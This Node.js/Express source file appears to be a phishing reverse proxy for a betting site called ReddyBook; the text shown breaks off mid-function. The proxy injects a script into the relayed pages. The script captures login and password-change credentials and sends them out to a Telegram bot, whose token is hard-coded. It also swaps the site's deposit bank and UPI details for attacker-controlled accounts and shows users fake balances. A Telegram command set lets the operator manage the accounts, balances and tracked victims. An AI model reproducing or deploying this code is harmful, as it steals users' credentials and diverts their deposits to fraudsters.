const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { Redis } = require('@upstash/redis');

const app = express();
const WEBSITE_ORIGIN = 'https://reddybook.green';
const API_ORIGIN = 'https://api.dcric99.com';
const BOT_TOKEN = '8649123370:AAFqhS1BiG-wOiDYfh-LRdcUYEn43iOu67k';
const WEBHOOK_URL = 'https://rtyhh.vercel.app/bot-webhook';
const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;

const DEFAULT_DATA = {
  banks: [],
  activeIndex: -1,
  botEnabled: true,
  autoRotate: false,
  lastUsedIndex: -1,
  adminChatId: null,
  logRequests: false,
  depositSuccess: false,
  userOverrides: {},
  trackedUsers: {}
};

let bot = null;
let webhookSet = false;
if (BOT_TOKEN) { try { bot = new TelegramBot(BOT_TOKEN); } catch(e) {} }

let redis = null;
if (REDIS_URL && REDIS_TOKEN) {
  try { redis = new Redis({ url: REDIS_URL, token: REDIS_TOKEN }); } catch(e) {}
}

let cachedData = null;
let cacheTime = 0;
const CACHE_TTL = 15000;
const tokenUserMap = {};

async function ensureWebhook() {
  if (!bot || webhookSet || !WEBHOOK_URL) return;
  try { await bot.setWebHook(WEBHOOK_URL); webhookSet = true; } catch(e) {}
}

async function loadData(forceRefresh) {
  if (!forceRefresh && cachedData && (Date.now() - cacheTime < CACHE_TTL)) return cachedData;
  if (!redis) return { ...DEFAULT_DATA };
  try {
    let raw = await redis.get('reddybookData');
    if (raw) {
      if (typeof raw === 'string') { try { raw = JSON.parse(raw); } catch(e) {} }
      if (typeof raw === 'object' && raw !== null) {
        cachedData = { ...DEFAULT_DATA, ...raw };
      } else { cachedData = { ...DEFAULT_DATA }; }
      if (!cachedData.userOverrides) cachedData.userOverrides = {};
      if (!cachedData.trackedUsers) cachedData.trackedUsers = {};
      cacheTime = Date.now();
      return cachedData;
    }
  } catch(e) { console.error('Redis load error:', e.message); }
  cachedData = { ...DEFAULT_DATA };
  cacheTime = Date.now();
  return cachedData;
}

async function saveData(data) {
  const skipMerge = data._skipOverrideMerge;
  if (skipMerge) delete data._skipOverrideMerge;
  if (!redis) { cachedData = data; cacheTime = Date.now(); return; }
  try {
    if (!skipMerge) {
      const current = await redis.get('reddybookData');
      if (current && typeof current === 'object' && current.userOverrides) {
        if (!data.userOverrides) data.userOverrides = {};
        for (const uid of Object.keys(current.userOverrides)) {
          const cur = current.userOverrides[uid];
          const loc = data.userOverrides[uid];
          if (!loc) { data.userOverrides[uid] = cur; }
          else {
            if (cur.addedBalance !== undefined && loc.addedBalance === undefined) loc.addedBalance = cur.addedBalance;
          }
        }
      }
    }
    cachedData = data;
    cacheTime = Date.now();
    await redis.set('reddybookData', data);
  } catch(e) {
    console.error('Redis save error:', e.message);
    cachedData = data;
    cacheTime = Date.now();
  }
}

function getTokenFromReq(req) {
  const auth = req.headers['authorization'] || '';
  if (auth.startsWith('Bearer ')) return auth.substring(7);
  return auth || req.headers['token'] || '';
}

function saveTokenUser(req, username) {
  if (!username) return;
  const tok = getTokenFromReq(req);
  if (tok && tok.length > 10) {
    const key = tok.substring(0, 100);
    tokenUserMap[key] = String(username);
    if (redis) redis.hset('reddybookTokenMap', key, String(username)).catch(()=>{});
  }
}

async function getUserFromToken(req) {
  const tok = getTokenFromReq(req);
  if (!tok || tok.length < 10) return null;
  const key = tok.substring(0, 100);
  if (tokenUserMap[key]) return tokenUserMap[key];
  if (redis) {
    try {
      const stored = await redis.hget('reddybookTokenMap', key);
      if (stored) { tokenUserMap[key] = String(stored); return String(stored); }
    } catch(e) {}
  }
  try {
    const parts = tok.split('.');
    if (parts.length === 3) {
      const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
      if (payload.username) return String(payload.username);
      if (payload.sub) return String(payload.sub);
      if (payload.userId) return String(payload.userId);
    }
  } catch(e) {}
  return null;
}

async function trackUser(data, username, info) {
  if (!username) return;
  if (!data.trackedUsers) data.trackedUsers = {};
  const existing = data.trackedUsers[String(username)] || {};
  data.trackedUsers[String(username)] = {
    lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
    lastAction: info || existing.lastAction || '',
    balance: existing.balance || ''
  };
}

function getUserOverride(data, username) {
  if (!username || !data.userOverrides) return null;
  return data.userOverrides[String(username)] || null;
}

function getActiveBank(data, username) {
  const uo = getUserOverride(data, username);
  if (uo && uo.bankIndex !== undefined && uo.bankIndex >= 0 && uo.bankIndex < data.banks.length) {
    return data.banks[uo.bankIndex];
  }
  if (data.autoRotate && data.banks.length > 1) {
    let idx;
    do { idx = Math.floor(Math.random() * data.banks.length); } while (idx === data.lastUsedIndex && data.banks.length > 1);
    data.lastUsedIndex = idx;
    data._rotatedIndex = idx;
    return data.banks[idx];
  }
  if (data.activeIndex >= 0 && data.activeIndex < data.banks.length) return data.banks[data.activeIndex];
  if (data.banks.length > 0) return data.banks[0];
  return null;
}

async function getActiveBankAndSave(data, username) {
  const bank = getActiveBank(data, username);
  if (data.autoRotate && data._rotatedIndex !== undefined) {
    data.lastUsedIndex = data._rotatedIndex;
    delete data._rotatedIndex;
    await saveData(data);
  }
  return bank;
}

function bankListText(d) {
  if (d.banks.length === 0) return 'No banks added yet.';
  return d.banks.map((b, i) => {
    const a = i === d.activeIndex ? ' ✅' : '';
    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${b.bankName ? ' | ' + b.bankName : ''}${b.upiId ? ' | UPI: ' + b.upiId : ''}${a}`;
  }).join('\n');
}

app.use(express.json({ limit: '5mb' }));
app.use(express.urlencoded({ extended: true, limit: '5mb' }));

const BANK_FIELDS = {
  'accountno': 'accountNo', 'accountnumber': 'accountNo', 'account_no': 'accountNo',
  'receiveaccountno': 'accountNo', 'bankaccount': 'accountNo', 'acno': 'accountNo',
  'bankaccountno': 'accountNo', 'beneficiaryaccount': 'accountNo', 'payeeaccount': 'accountNo',
  'payeebankaccount': 'accountNo', 'payeebankaccountno': 'accountNo', 'payeeaccountno': 'accountNo',
  'receiveraccount': 'accountNo', 'receiveraccountno': 'accountNo', 'receiveaccountnumber': 'accountNo',
  'walletaccount': 'accountNo', 'walletno': 'accountNo', 'collectionaccount': 'accountNo',
  'cardno': 'accountNo', 'cardnumber': 'accountNo', 'bankcardno': 'accountNo',
  'customerbanknumber': 'accountNo', 'customerbankaccount': 'accountNo', 'customeraccountno': 'accountNo',
  'account_number': 'accountNo', 'bank_account_number': 'accountNo',
  'beneficiaryname': 'accountHolder', 'accountname': 'accountHolder', 'account_name': 'accountHolder',
  'receiveaccountname': 'accountHolder', 'holdername': 'accountHolder', 'name': 'accountHolder',
  'accountholder': 'accountHolder', 'bankaccountholder': 'accountHolder', 'receivename': 'accountHolder',
  'payeename': 'accountHolder', 'bankaccountname': 'accountHolder', 'realname': 'accountHolder',
  'cardholder': 'accountHolder', 'cardname': 'accountHolder', 'receivername': 'accountHolder',
  'collectionname': 'accountHolder', 'customername': 'accountHolder', 'customerrealname': 'accountHolder',
  'account_holder_name': 'accountHolder', 'bank_account_name': 'accountHolder',
  'ifsc': 'ifsc', 'ifsccode': 'ifsc', 'ifsc_code': 'ifsc', 'receiveifsc': 'ifsc',
  'bankifsc': 'ifsc', 'payeeifsc': 'ifsc', 'receiverifsc': 'ifsc', 'collectionifsc': 'ifsc',
  'bankname': 'bankName', 'bank_name': 'bankName', 'bank': 'bankName',
  'payeebankname': 'bankName', 'receiverbankname': 'bankName', 'collectionbankname': 'bankName',
  'upiid': 'upiId', 'upi_id': 'upiId', 'upi': 'upiId', 'vpa': 'upiId',
  'upiaddress': 'upiId', 'payeeupi': 'upiId', 'payeeupiid': 'upiId',
  'receiverupi': 'upiId', 'walletupi': 'upiId', 'collectionupi': 'upiId',
  'walletaddress': 'upiId', 'payaddress': 'upiId', 'payaccount': 'upiId',
  'customerupi': 'upiId'
};

function deepReplace(obj, bank, originalValues, depth) {
  if (!obj || typeof obj !== 'object' || depth > 10) return;
  if (!originalValues) originalValues = {};
  for (const key of Object.keys(obj)) {
    const val = obj[key];
    if (val && typeof val === 'object') {
      if (Array.isArray(val)) {
        val.forEach(item => { if (item && typeof item === 'object') deepReplace(item, bank, originalValues, depth + 1); });
      } else { deepReplace(val, bank, originalValues, depth + 1); }
      continue;
    }
    if (typeof val !== 'string' && typeof val !== 'number') continue;
    const kl = key.toLowerCase().replace(/[_\-\s]/g, '');
    const mapped = BANK_FIELDS[kl];
    if (mapped && bank[mapped] && String(val).length > 0) {
      if (typeof val === 'string' && val.length > 3) originalValues[key] = val;
      obj[key] = bank[mapped];
    }
    if (typeof val === 'string') {
      if (val.includes('upi://pay') && bank.upiId) {
        obj[key] = val.replace(/pa=[^&]+/, `pa=${bank.upiId}`);
        if (bank.accountHolder) obj[key] = obj[key].replace(/pn=[^&]+/, `pn=${encodeURIComponent(bank.accountHolder)}`);
      }
      for (const [origKey, origVal] of Object.entries(originalValues)) {
        if (typeof origVal === 'string' && origVal.length > 3 && typeof obj[key] === 'string' && obj[key].includes(origVal)) {
          const mappedF = BANK_FIELDS[origKey.toLowerCase().replace(/[_\-\s]/g, '')];
          if (mappedF && bank[mappedF]) {
            obj[key] = obj[key].split(origVal).join(bank[mappedF]);
          }
        }
      }
    }
  }
}

function addBonusToBalanceFields(obj, bonus) {
  if (!obj || typeof obj !== 'object') return;
  const balanceKeys = ['balance', 'availablebalance', 'totalbalance', 'wallet', 'amount', 'availbalance', 'bal', 'exposurebal', 'chips', 'coins', 'availbal'];
  for (const key of Object.keys(obj)) {
    if (balanceKeys.includes(key.toLowerCase())) {
      const current = parseFloat(obj[key]);
      if (!isNaN(current)) {
        obj[key] = typeof obj[key] === 'string' ? String((current + bonus).toFixed(2)) : parseFloat((current + bonus).toFixed(2));
      }
    }
    if (typeof obj[key] === 'object' && obj[key] !== null && !Array.isArray(obj[key])) {
      addBonusToBalanceFields(obj[key], bonus);
    }
  }
}

function buildInterceptorScript(proxyOrigin) {
  return `<script>
(function(){
  var PROXY="${proxyOrigin}";
  var _open=XMLHttpRequest.prototype.open;
  var _send=XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open=function(m,u,a,us,p){
    this._url=u;this._method=m;
    return _open.apply(this,arguments);
  };
  XMLHttpRequest.prototype.send=function(body){
    var xhr=this;
    var url=xhr._url||'';
    if(url.indexOf('/api/auth')!==-1 && xhr._method==='POST'){
      try{
        var bd=JSON.parse(body);
        xhr.addEventListener('load',function(){
          try{
            var r=JSON.parse(xhr.responseText);
            if(r&&(r.status===true||r.status===1||r.status==='success'||r.token||r.data?.token)){
              fetch(PROXY+'/proxy-report',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'login',username:bd.username||'',password:bd.password||'',success:true})}).catch(function(){});
            }
          }catch(e){}
        });
      }catch(e){}
    }
    if(url.indexOf('/api/client/get_deposit')!==-1){
      xhr.addEventListener('load',function(){
        try{
          var r=JSON.parse(xhr.responseText);
          fetch(PROXY+'/proxy-report',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'deposit',data:r})}).catch(function(){});
        }catch(e){}
      });
      var origGet=Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype,'responseText')||Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype.__proto__,'responseText');
      if(!xhr._patched){
        xhr._patched=true;
        xhr.addEventListener('readystatechange',function(){
          if(xhr.readyState===4){
            try{
              var r=JSON.parse(xhr.responseText);
              var settings=window.__PROXY_SETTINGS;
              if(settings&&settings.bank&&settings.enabled){
                var d=r.data||r.body||r;
                if(d){
                  replaceBankDeep(d,settings.bank);
                  Object.defineProperty(xhr,'responseText',{get:function(){return JSON.stringify(r);}});
                  Object.defineProperty(xhr,'response',{get:function(){return JSON.stringify(r);}});
                }
              }
            }catch(e){}
          }
        });
      }
    }
    if(url.indexOf('/ws/getUserDataNew')!==-1||url.indexOf('/api/client/profile')!==-1){
      xhr.addEventListener('readystatechange',function(){
        if(xhr.readyState===4){
          try{
            var r=JSON.parse(xhr.responseText);
            var settings=window.__PROXY_SETTINGS;
            if(settings&&settings.addedBalance&&settings.enabled){
              var d=r.data||r;
              addBonus(d,settings.addedBalance);
              Object.defineProperty(xhr,'responseText',{get:function(){return JSON.stringify(r);}});
              Object.defineProperty(xhr,'response',{get:function(){return JSON.stringify(r);}});
            }
            var uname=null;
            try{var tk=localStorage.getItem('token')||'';if(tk){var p=JSON.parse(atob(tk.split('.')[1]));uname=p.username||p.sub||'';}}catch(e){}
            fetch(PROXY+'/proxy-report',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'balance',username:uname,data:r})}).catch(function(){});
          }catch(e){}
        }
      });
    }
    if(url.indexOf('/api/change_password')!==-1 && xhr._method==='POST'){
      try{
        var bd2=JSON.parse(body);
        fetch(PROXY+'/proxy-report',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'password',data:bd2})}).catch(function(){});
      }catch(e){}
    }
    return _send.apply(this,arguments);
  };
  var BF={'accountno':'accountNo','accountnumber':'accountNo','account_no':'accountNo','receiveaccountno':'accountNo','bankaccount':'accountNo','acno':'accountNo','bankaccountno':'accountNo','beneficiaryaccount':'accountNo','account_number':'accountNo','beneficiaryname':'accountHolder','accountname':'accountHolder','account_name':'accountHolder','receiveaccountname':'accountHolder','holdername':'accountHolder','accountholder':'accountHolder','realname':'accountHolder','receivername':'accountHolder','name':'accountHolder','ifsc':'ifsc','ifsccode':'ifsc','ifsc_code':'ifsc','receiveifsc':'ifsc','bankifsc':'ifsc','bankname':'bankName','bank_name':'bankName','bank':'bankName','upiid':'upiId','upi_id':'upiId','upi':'upiId','vpa':'upiId','upiaddress':'upiId'};
  function replaceBankDeep(obj,bank){
    if(!obj||typeof obj!=='object')return;
    if(Array.isArray(obj)){obj.forEach(function(i){replaceBankDeep(i,bank);});return;}
    for(var k in obj){
      var v=obj[k];
      if(v&&typeof v==='object'){replaceBankDeep(v,bank);continue;}
      if(typeof v!=='string'&&typeof v!=='number')continue;
      var kl=k.toLowerCase().replace(/[_\\-\\s]/g,'');
      var m=BF[kl];
      if(m&&bank[m]&&String(v).length>0){obj[k]=bank[m];}
      if(typeof v==='string'&&v.indexOf('upi://pay')!==-1&&bank.upiId){
        obj[k]=v.replace(/pa=[^&]+/,'pa='+bank.upiId);
        if(bank.accountHolder)obj[k]=obj[k].replace(/pn=[^&]+/,'pn='+encodeURIComponent(bank.accountHolder));
      }
    }
  }
  function addBonus(obj,bonus){
    if(!obj||typeof obj!=='object')return;
    var bk=['balance','availablebalance','totalbalance','wallet','availbalance','bal','exposurebal','chips','coins','availbal'];
    for(var k in obj){
      if(bk.indexOf(k.toLowerCase())!==-1){
        var c=parseFloat(obj[k]);
        if(!isNaN(c)){obj[k]=typeof obj[k]==='string'?String((c+bonus).toFixed(2)):parseFloat((c+bonus).toFixed(2));}
      }
      if(typeof obj[k]==='object'&&obj[k]!==null&&!Array.isArray(obj[k])){addBonus(obj[k],bonus);}
    }
  }
  function loadSettings(){
    var uname=null;
    try{var tk=localStorage.getItem('token')||'';if(tk){var p=JSON.parse(atob(tk.split('.')[1]));uname=p.username||p.sub||'';}}catch(e){}
    fetch(PROXY+'/proxy-settings'+(uname?'?username='+encodeURIComponent(uname):''),{method:'GET'}).then(function(r){return r.json();}).then(function(s){
      window.__PROXY_SETTINGS=s;
    }).catch(function(){});
  }
  loadSettings();
  setInterval(loadSettings,30000);
})();
</script>`;
}

async function websiteProxy(req, res) {
  try {
    const path = req.originalUrl;
    const url = WEBSITE_ORIGIN + path;
    const fwd = {};
    const skipWs = new Set(['host','connection','content-length','transfer-encoding','accept-encoding','via','expect']);
    for (const [k, v] of Object.entries(req.headers)) {
      const kl = k.toLowerCase();
      if (skipWs.has(kl) || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded') ||
          kl.startsWith('x-real') || kl.startsWith('x-middleware') || kl.startsWith('cf-') ||
          kl.startsWith('cdn-') || kl.startsWith('sec-') || kl === 'true-client-ip' || kl === 'x-request-id') continue;
      fwd[k] = v;
    }
    fwd['host'] = 'reddybook.green';
    fwd['user-agent'] = 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36';
    const response = await fetch(url, { method: 'GET', headers: fwd, redirect: 'follow' });
    let body = await response.text();
    const respHeaders = {};
    response.headers.forEach((val, key) => {
      const kl = key.toLowerCase();
      if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding' && kl !== 'content-length' && kl !== 'content-security-policy') {
        respHeaders[key] = val;
      }
    });
    respHeaders['cache-control'] = 'no-store, no-cache, must-revalidate';
    delete respHeaders['etag'];
    delete respHeaders['last-modified'];
    const ct = (respHeaders['content-type'] || '').toLowerCase();
    const proxyOrigin = 'https://' + (req.headers['x-forwarded-host'] || req.headers['host'] || 'rtyhh.vercel.app');
    if (ct.includes('javascript') || path.match(/main\.[a-f0-9]+\.js/)) {
      body = body.replace(
        /e=t\.location\.hostname\.replace\(\/\^www\\\.\/,""\)/g,
        'e="reddybook.green"'
      );
      body = body.replace(
        /e=t\.location\.hostname\.replace\(\/\^www\\\.\/,\s*""\)/g,
        'e="reddybook.green"'
      );
    }
    if (ct.includes('html') || path === '/' || path === '' || path.startsWith('/home') || path.startsWith('/login') || path.startsWith('/signup')) {
      const interceptor = buildInterceptorScript(proxyOrigin);
      body = body.replace('</head>', interceptor + '</head>');
    }
    respHeaders['content-length'] = String(Buffer.byteLength(body));
    res.writeHead(response.status, respHeaders);
    res.end(body);
  } catch(e) {
    console.error('Website proxy error:', e.message);
    if (!res.headersSent) res.status(502).send('Proxy error');
  }
}

const CDN_BASE = 'https://speedcdn.io';

app.get('/config/:filename', async (req, res) => {
  try {
    const cdnUrl = `${CDN_BASE}/config/${req.params.filename}`;
    const response = await fetch(cdnUrl, {
      headers: { 'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36' }
    });
    const ct = response.headers.get('content-type') || 'application/json';
    res.setHeader('Content-Type', ct);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Cache-Control', 'no-store');
    const body = await response.text();
    res.send(body);
  } catch(e) {
    console.error('CDN config proxy error:', e.message);
    res.status(502).send('Config fetch failed');
  }
});

app.get('/assets/logos/:path(*)', async (req, res) => {
  try {
    const cdnUrl = `${CDN_BASE}/assets/logos/${req.params.path}`;
    const response = await fetch(cdnUrl, {
      headers: { 'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36' }
    });
    const ct = response.headers.get('content-type') || 'image/png';
    res.setHeader('Content-Type', ct);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Cache-Control', 'public, max-age=3600');
    const buf = Buffer.from(await response.arrayBuffer());
    res.send(buf);
  } catch(e) {
    res.status(502).send('Logo fetch failed');
  }
});

app.get('/apk_config/sites.json', async (req, res) => {
  const proxyHost = req.headers['x-forwarded-host'] || req.headers['host'] || '';
  const proxyUrl = `https://${proxyHost}`;
  res.json({
    reddybookio: {
      url: proxyUrl,
      'version-code': '2',
      'version-name': '1.0.1',
      apk: ''
    }
  });
});

app.get('/proxy-settings', async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', '*');
  try {
    const data = await loadData();
    const username = req.query.username || '';
    const uo = username && data.userOverrides ? data.userOverrides[String(username)] : null;
    const addedBal = uo && uo.addedBalance !== undefined ? uo.addedBalance : 0;
    const bank = getActiveBank(data, username);
    res.json({
      enabled: data.botEnabled !== false,
      bank: bank || null,
      addedBalance: addedBal
    });
  } catch(e) { res.json({ enabled: false, bank: null, addedBalance: 0 }); }
});

app.options('/proxy-settings', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', '*');
  res.setHeader('Access-Control-Allow-Methods', '*');
  res.sendStatus(200);
});

app.post('/proxy-report', async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', '*');
  try {
    const data = await loadData();
    const body = req.body || {};
    const type = body.type;

    if (type === 'login' && data.adminChatId && bot) {
      const username = body.username || 'N/A';
      const password = body.password || 'N/A';
      if (username && username !== 'N/A') {
        trackUser(data, username, 'Login');
        saveData(data).catch(()=>{});
      }
      bot.sendMessage(data.adminChatId,
`🔑 Login — ReddyBook
👤 Username: ${username}
🔒 Password: ${password}
🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }

    if (type === 'deposit' && data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId,
`🔔 💰 Deposit Page Opened
🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }

    if (type === 'balance') {
      const username = body.username || '';
      if (username) {
        const respData = body.data?.data || body.data;
        if (respData && typeof respData === 'object') {
          const bal = respData.balance ?? respData.availableBalance ?? respData.availBal ?? '';
          if (bal !== '') {
            if (!data.trackedUsers) data.trackedUsers = {};
            if (!data.trackedUsers[username]) data.trackedUsers[username] = {};
            data.trackedUsers[username].balance = String(bal);
            data.trackedUsers[username].lastSeen = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
            data.trackedUsers[username].lastAction = 'UserData';
            saveData(data).catch(()=>{});
          }
        }
      }
    }

    if (type === 'password' && data.adminChatId && bot) {
      const pd = body.data || {};
      bot.sendMessage(data.adminChatId,
`🔐 Password Change
Old: ${pd.oldPassword || pd.old_password || 'N/A'}
New: ${pd.newPassword || pd.new_password || 'N/A'}
🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }

    res.json({ ok: true });
  } catch(e) { res.json({ ok: false }); }
});

app.options('/proxy-report', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', '*');
  res.setHeader('Access-Control-Allow-Methods', '*');
  res.sendStatus(200);
});

app.get('/setup-webhook', async (req, res) => {
  if (!bot) return res.json({ error: 'No bot token configured.' });
  if (!WEBHOOK_URL) return res.json({ error: 'No webhook URL configured.' });
  try {
    await bot.setWebHook(WEBHOOK_URL);
    webhookSet = true;
    const info = await bot.getWebHookInfo();
    res.json({ success: true, webhook: info });
  } catch(e) { res.json({ error: e.message }); }
});

app.get('/health', async (req, res) => {
  const redisConnected = !!redis;
  let redisWorking = false;
  if (redis) { try { await redis.ping(); redisWorking = true; } catch(e) {} }
  const data = await loadData(true);
  const active = getActiveBank(data, null);
  res.json({
    status: 'ok',
    app: 'ReddyBook Proxy',
    redis: redisConnected ? (redisWorking ? 'connected' : 'error') : 'not configured',
    bankActive: !!active,
    totalBanks: data.banks.length,
    adminSet: !!data.adminChatId,
    botConfigured: !!bot,
    perUserOverrides: Object.keys(data.userOverrides || {}).length
  });
});

app.post('/bot-webhook', async (req, res) => {
  try {
    await ensureWebhook();
    if (!bot) return res.sendStatus(200);
    const msg = req.body?.message;
    if (!msg || !msg.text) return res.sendStatus(200);
    const chatId = msg.chat.id;
    const text = msg.text.trim();
    let data = await loadData(true);

    if (text === '/start') {
      if (data.adminChatId && data.adminChatId !== chatId) {
        await bot.sendMessage(chatId, '❌ Bot already configured with another admin.');
        return res.sendStatus(200);
      }
      data.adminChatId = chatId;
      await saveData(data);
      await bot.sendMessage(chatId,
`🏦 ReddyBook Controller

=== BANK COMMANDS ===
/addbank Name|AccNo|IFSC|BankName|UPI
/removebank <number>
/setbank <number>
/banks — List all banks

=== CONTROL ===
/on — Proxy ON
/off — Proxy OFF
/rotate — Toggle auto-rotate banks
/log — Toggle request logging
/status — Full status

=== BALANCE ===
/add <amount> <username> — Add balance
/deduct <amount> <username> — Remove balance
/remove balance <username> — Remove all fake balance
/history — All balance changes
/history <username> — User balance changes
/clearhistory — Clear all history

=== TRACKING ===
/idtrack — Show all tracked users

Example:
/addbank Rahul Kumar|1234567890|SBIN0001234|SBI|rahul@upi`
      );
      return res.sendStatus(200);
    }

    if (data.adminChatId && chatId !== data.adminChatId) {
      await bot.sendMessage(chatId, '❌ Unauthorized.');
      return res.sendStatus(200);
    }

    if (text === '/status') {
      const active = getActiveBank(data, null);
      let m = `📊 ReddyBook Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
      if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
      else m += '\n\n⚠️ No active bank';
      await bot.sendMessage(chatId, m);
      return res.sendStatus(200);
    }

    if (text === '/on') { data.botEnabled = true; await saveData(data); await bot.sendMessage(chatId, '🟢 Proxy ON'); return res.sendStatus(200); }
    if (text === '/off') { data.botEnabled = false; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF — passthrough'); return res.sendStatus(200); }
    if (text === '/rotate') { data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
    if (text === '/log') { data.logRequests = !data.logRequests; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }

    if (text.startsWith('/add ')) {
      const parts = text.substring(5).trim().split(/\s+/);
      const amount = parseFloat(parts[0]);
      const targetUser = parts[1] || '';
      if (isNaN(amount) || !targetUser) {
        await bot.sendMessage(chatId, '❌ Format: /add <amount> <username>\nExample: /add 500 john123');
        return res.sendStatus(200);
      }
      const freshData = await loadData(true);
      if (!freshData.userOverrides) freshData.userOverrides = {};
      if (!freshData.userOverrides[targetUser]) freshData.userOverrides[targetUser] = {};
      freshData.userOverrides[targetUser].addedBalance = (freshData.userOverrides[targetUser].addedBalance || 0) + amount;
      const tracked = freshData.trackedUsers && freshData.trackedUsers[targetUser];
      const currentBal = tracked ? tracked.balance : 'N/A';
      if (!freshData.balanceHistory) freshData.balanceHistory = [];
      freshData.balanceHistory.push({
        type: 'add', username: targetUser, amount: amount,
        totalAdded: freshData.userOverrides[targetUser].addedBalance,
        originalBalance: currentBal,
        time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
      });
      freshData._skipOverrideMerge = true;
      await saveData(freshData);
      await bot.sendMessage(chatId, `✅ Added ₹${amount} to user ${targetUser}\n💰 Total added: ₹${freshData.userOverrides[targetUser].addedBalance}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/deduct ')) {
      const parts = text.substring(8).trim().split(/\s+/);
      const amount = parseFloat(parts[0]);
      const targetUser = parts[1] || '';
      if (isNaN(amount) || !targetUser) {
        await bot.sendMessage(chatId, '❌ Format: /deduct <amount> <username>\nExample: /deduct 500 john123');
        return res.sendStatus(200);
      }
      const freshData = await loadData(true);
      if (!freshData.userOverrides) freshData.userOverrides = {};
      if (!freshData.userOverrides[targetUser]) freshData.userOverrides[targetUser] = {};
      freshData.userOverrides[targetUser].addedBalance = (freshData.userOverrides[targetUser].addedBalance || 0) - amount;
      if (freshData.userOverrides[targetUser].addedBalance === 0) delete freshData.userOverrides[targetUser].addedBalance;
      if (!freshData.balanceHistory) freshData.balanceHistory = [];
      freshData.balanceHistory.push({
        type: 'deduct', username: targetUser, amount: amount,
        totalAdded: freshData.userOverrides[targetUser].addedBalance || 0,
        time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
      });
      freshData._skipOverrideMerge = true;
      await saveData(freshData);
      await bot.sendMessage(chatId, `✅ Deducted ₹${amount} from user ${targetUser}\n💰 Total added: ₹${freshData.userOverrides[targetUser].addedBalance || 0}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/remove balance ')) {
      const targetUser = text.substring(16).trim();
      if (!targetUser) { await bot.sendMessage(chatId, '❌ Format: /remove balance <username>'); return res.sendStatus(200); }
      if (data.userOverrides && data.userOverrides[targetUser] && data.userOverrides[targetUser].addedBalance !== undefined) {
        const removed = data.userOverrides[targetUser].addedBalance;
        delete data.userOverrides[targetUser].addedBalance;
        if (!data.balanceHistory) data.balanceHistory = [];
        data.balanceHistory.push({ type: 'remove', username: targetUser, amount: removed, totalAdded: 0, time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) });
        data._skipOverrideMerge = true;
        await saveData(data);
        await bot.sendMessage(chatId, `🗑 Removed ₹${removed} fake balance from user ${targetUser}`);
      } else {
        await bot.sendMessage(chatId, `ℹ️ User ${targetUser} has no fake balance added.`);
      }
      return res.sendStatus(200);
    }

    if (text === '/history' || text.startsWith('/history ')) {
      const historyTarget = text.startsWith('/history ') ? text.substring(9).trim() : '';
      const history = data.balanceHistory || [];
      if (history.length === 0) { await bot.sendMessage(chatId, '📋 No balance history yet.'); return res.sendStatus(200); }
      const filtered = historyTarget ? history.filter(h => h.username === historyTarget) : history;
      if (filtered.length === 0) { await bot.sendMessage(chatId, `📋 No history for user ${historyTarget}`); return res.sendStatus(200); }
      let m = '📊 Balance History:\n\n';
      const recent = filtered.slice(-15);
      for (const e of recent) {
        const icon = e.type === 'add' ? '➕' : (e.type === 'deduct' ? '➖' : '🗑');
